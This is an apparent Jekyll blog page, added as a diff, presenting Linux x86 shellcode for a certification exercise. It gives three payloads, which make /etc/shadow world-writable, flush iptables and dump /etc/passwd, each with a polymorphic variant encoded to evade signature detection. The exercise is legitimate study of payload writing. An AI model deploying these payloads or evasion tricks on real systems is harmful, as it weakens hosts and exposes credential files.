@@ -1,0 +1,711 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Polymorphic Linux Shellcode - hackcommander.io</title>
+<meta name="description" content="This blog post shows 3 polymorphic variants of common shellcodes found on shell-storm.org.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Polymorphic Linux Shellcode">
+<meta property="og:url" content="http://localhost:4000/polymorphic-shellcode/">
+
+
+  <meta property="og:description" content="This blog post shows 3 polymorphic variants of common shellcodes found on shell-storm.org.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/slae32.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2018-12-11T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/polymorphic-shellcode/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Polymorphic Linux Shellcode</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Polymorphic Linux Shellcode">
+    <meta itemprop="description" content="This blog post shows 3 polymorphic variants of common shellcodes found on shell-storm.org.">
+    <meta itemprop="datePublished" content="December 11, 2018">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Polymorphic Linux Shellcode
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2018-12-11T00:00:00+01:00">December 11, 2018 </time>&emsp;
+          
+          
+        </p>
+        <p>This blog post shows 3 polymorphic variants of common shellcodes found on <a href="http://shell-storm.org/shellcode/">shell-storm.org</a>.</p>
+
+<p>Note that the original shellcode is shown here using Intel syntax.</p>
+
+<h2 id="sample-1-linuxx86---chmodetcshadow-0777">Sample 1: Linux/x86 - chmod(/etc/shadow, 0777)</h2>
+
+<ul>
+  <li>Original size: 29 bytes</li>
+  <li>Polymorphic size: 41 bytes (41% increase)</li>
+  <li>Source: <a href="http://shell-storm.org/shellcode/files/shellcode-593.php">http://shell-storm.org/shellcode/files/shellcode-593.php</a></li>
+</ul>
+
+<h3 id="original-code">Original code:</h3>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nl">_start:</span>
+
+<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
+<span class="nf">push</span> <span class="nb">eax</span>
+<span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x776f6461</span> <span class="c1">; /etc/shadow</span>
+<span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x68732f63</span>
+<span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x74652f2f</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span>
+<span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x1ff</span>
+<span class="nf">pop</span> <span class="nb">ecx</span>
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0xf</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+
+<h3 id="polymorphic-code">Polymorphic code:</h3>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nl">_start:</span>
+
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mh">0x01ff87fd</span> <span class="c1">; XOR key + mode (upper half)</span>
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x0188e899</span> <span class="c1">; /etc/shadow (XOR encoded)</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x6097f4d2</span>
+<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x628be2d2</span>
+<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">ecx</span>
+<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ecx</span>
+<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ecx</span>
+<span class="nf">push</span> <span class="nb">eax</span>
+<span class="nf">push</span> <span class="nb">ebx</span>
+<span class="nf">push</span> <span class="nb">edx</span>  
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>        <span class="c1">; const char *pathname</span>
+<span class="nf">shr</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">16</span>         <span class="c1">; mode_t mode -&gt; 0777</span>
+<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0xf</span>        <span class="c1">; sys_chmod</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+
+<h2 id="sample-2-linuxx86---iptables--f">Sample 2: Linux/x86 - iptables -F</h2>
+
+<ul>
+  <li>Original size: 58 bytes</li>
+  <li>Polymorphic size: 67 bytes (15% increase)</li>
+  <li>Source: <a href="http://shell-storm.org/shellcode/files/shellcode-361.php">http://shell-storm.org/shellcode/files/shellcode-361.php</a></li>
+</ul>
+
+<h3 id="original-code-1">Original code</h3>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nl">_start:</span>
+
+<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">callme</span>
+
+<span class="nl">main:</span>
+
+<span class="nf">pop</span> <span class="nb">esi</span>
+<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
+<span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">14</span><span class="p">],</span><span class="nb">al</span>
+<span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">17</span><span class="p">],</span><span class="nb">al</span>
+<span class="nf">mov</span> <span class="nv">long</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">18</span><span class="p">],</span><span class="nb">esi</span>
+<span class="nf">lea</span> <span class="nb">ebx</span><span class="p">,[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">15</span><span class="p">]</span>
+<span class="nf">mov</span> <span class="nv">long</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">22</span><span class="p">],</span><span class="nb">ebx</span>
+<span class="nf">mov</span> <span class="nv">long</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">26</span><span class="p">],</span><span class="nb">eax</span>
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x0b</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esi</span>
+<span class="nf">lea</span> <span class="nb">ecx</span><span class="p">,[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">18</span><span class="p">]</span>
+<span class="nf">lea</span> <span class="nb">edx</span><span class="p">,[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">26</span><span class="p">]</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+
+<span class="nl">callme:</span>
+
+<span class="nf">call</span> <span class="nv">main</span>
+<span class="kd">db</span> <span class="err">'</span><span class="o">/</span><span class="nv">sbin</span><span class="o">/</span><span class="nv">iptables#</span><span class="o">-</span><span class="nv">F#</span><span class="err">'</span>
+</code></pre></div></div>
+
+<h3 id="polymorphic-code-1">Polymorphic code</h3>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nl">_start:</span>
+
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x2d5a5a46</span>     <span class="c1">; 0x5a462d5a (shifted 16 bits)</span>
+<span class="nf">ror</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x10</span>
+<span class="nf">push</span> <span class="nb">eax</span>
+<span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x191f3f08</span>
+<span class="nf">push</span> <span class="nb">eax</span>
+<span class="nf">sub</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x11f0fbf9</span>
+<span class="nf">push</span> <span class="nb">eax</span>
+<span class="nf">sub</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x32450202</span>
+<span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x2</span>            <span class="c1">; avoid null-byte</span>
+<span class="nf">push</span> <span class="nb">eax</span>
+<span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x3343c0c6</span>
+<span class="nf">push</span> <span class="nb">eax</span>
+
+<span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; esi -&gt; "//sbin//iptablesZ-FZ" </span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esi</span>            <span class="c1">; const char *filename</span>
+<span class="nf">cdq</span>                     <span class="c1">; edx = 0</span>
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">edx</span>            <span class="c1">; eax = 0</span>
+<span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">16</span><span class="p">],</span> <span class="nb">dl</span>   <span class="c1">; null out Z byte: //sbin//iptablesZ -&gt; "//sbin//iptables"</span>
+<span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">19</span><span class="p">],</span> <span class="nb">dl</span>   <span class="c1">; null out Z byte: -FZ -&gt; "-F"</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; null-terminatation for argv</span>
+<span class="nf">lea</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">17</span><span class="p">]</span>       <span class="c1">; char *const argv[1] -&gt; "-F"</span>
+<span class="nf">push</span> <span class="nb">eax</span>                <span class="c1">; </span>
+<span class="nf">push</span> <span class="nb">esi</span>                <span class="c1">; char *const argv[0] -&gt; "//sbin//iptables"</span>
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; char *const argv[] -&gt; "//sbin//iptables", "-F"</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; NULL byte for envp[]</span>
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">edx</span>            <span class="c1">; eax = 0</span>
+<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; char *const envp[] -&gt; NULL</span>
+<span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0xb</span>            <span class="c1">; sys_execve</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+
+<h2 id="sample-3-linuxx86---file-reader-etcpasswd">Sample 3: Linux/x86 - File Reader /etc/passwd</h2>
+
+<ul>
+  <li>Original size: 76 bytes</li>
+  <li>Polymorphic size: 90 bytes (18% increase)</li>
+  <li>Source: <a href="http://shell-storm.org/shellcode/files/shellcode-73.php">http://shell-storm.org/shellcode/files/shellcode-73.php</a></li>
+</ul>
+
+<h3 id="original-code-2">Original code</h3>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nl">_start:</span>
+
+<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
+<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
+<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
+<span class="nf">jmp</span> <span class="nv">two</span>
+
+<span class="nl">one:</span>
+
+<span class="nf">pop</span> <span class="nb">ebx</span>
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x5</span>
+<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+<span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="nf">jmp</span> <span class="nv">read</span>
+
+<span class="nl">exit:</span>
+
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x1</span>
+<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+
+<span class="nl">read:</span>
+
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esi</span>
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x3</span>
+<span class="nf">sub</span> <span class="nb">esp</span><span class="p">,</span> <span class="mh">0x1</span>
+<span class="nf">lea</span> <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="p">]</span>
+<span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x1</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+
+<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
+<span class="nf">cmp</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="nf">je</span> <span class="nv">exit</span>
+
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x4</span>
+<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x1</span>
+<span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x1</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+
+<span class="nf">add</span> <span class="nb">esp</span><span class="p">,</span> <span class="mh">0x1</span>
+<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">read</span>
+
+<span class="nl">two:</span>
+
+<span class="nf">call</span> <span class="nv">one</span>
+<span class="kd">db</span> <span class="s">'/etc/passwd'</span>
+</code></pre></div></div>
+
+<h3 id="polymorphic-code-2">Polymorphic code</h3>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nl">_start:</span>
+
+<span class="nf">push</span> <span class="mh">0xbadacd9c</span>                 <span class="c1">; //etc/passwd (XOR encoded)</span>
+<span class="nf">push</span> <span class="mh">0xbfdd918c</span>
+<span class="nf">push</span> <span class="mh">0xaac891c0</span>
+
+<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
+<span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">3</span>
+<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
+
+<span class="nl">decode:</span>
+
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">edx</span><span class="p">]</span>
+<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0xdeadbeef</span>             <span class="c1">; XOR key</span>
+<span class="nf">mov</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">edx</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x4</span>
+<span class="nf">loop</span> <span class="nv">decode</span>
+
+<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>                    <span class="c1">; eax = 0</span>
+<span class="nf">cdq</span>                             <span class="c1">; edx = 0</span>
+<span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">12</span><span class="p">],</span> <span class="nb">al</span>           <span class="c1">; null terminate string "//etc/passwd"</span>
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x5</span>                     <span class="c1">; sys_open</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>                    <span class="c1">; const char *pathname</span>
+<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>                    <span class="c1">; int flags</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+
+<span class="nl">read:</span>
+
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>                    <span class="c1">; void *buf</span>
+<span class="nf">push</span> <span class="nb">eax</span>                        <span class="c1">; save fd value for next byte read loop</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">eax</span>                    <span class="c1">; int fd</span>
+<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>                    <span class="c1">; eax = 0</span>
+<span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x1</span>                     <span class="c1">; size_t count = 1, we're reading a single byte at a time</span>
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x3</span>                     <span class="c1">; sys_read</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+
+<span class="nf">cdq</span>                             <span class="c1">; edx = 0</span>
+<span class="nf">cmp</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>                    <span class="c1">; check if we have any bytes left to read</span>
+<span class="nf">je</span> <span class="nv">exit</span>                         <span class="c1">; if not, exit</span>
+
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">edx</span>                    <span class="c1">; eax = 0</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">eax</span>                    <span class="c1">; ebx = 0</span>
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x4</span>                     <span class="c1">; sys_write</span>
+<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x1</span>                     <span class="c1">; int fd = 1 (stdout)</span>
+<span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x1</span>                     <span class="c1">; size_t count = 1, we're writing a single byte at a time</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+
+<span class="nf">pop</span> <span class="nb">eax</span>                         <span class="c1">; restore fd value</span>
+<span class="nf">jmp</span> <span class="nv">read</span>                        <span class="c1">; loop to next byte</span>
+
+<span class="nl">exit:</span>
+
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">edx</span>                    <span class="c1">; eax = 0</span>
+<span class="nf">inc</span> <span class="nb">eax</span>                         <span class="c1">; eax = 1, sys_exit</span>
+<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>                    <span class="c1">; ebx = 0, int status</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p>
+
+<p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
+
+<p>Student ID: SLAE-1236</p>
+
+<p>All source files can be found on GitHub at <a href="https://github.com/slemire/slae32">https://github.com/slemire/slae32</a></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#assembly" class="page__taxonomy-item" rel="tag">assembly</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#polymorphic" class="page__taxonomy-item" rel="tag">polymorphic</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#slae" class="page__taxonomy-item" rel="tag">slae</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#slae" class="page__taxonomy-item" rel="tag">slae</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2018-12-11T00:00:00+01:00">December 11, 2018</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-active/" class="pagination--pager" title="Active - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/custom-crypter/" class="pagination--pager" title="Creating a custom shellcode crypter
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
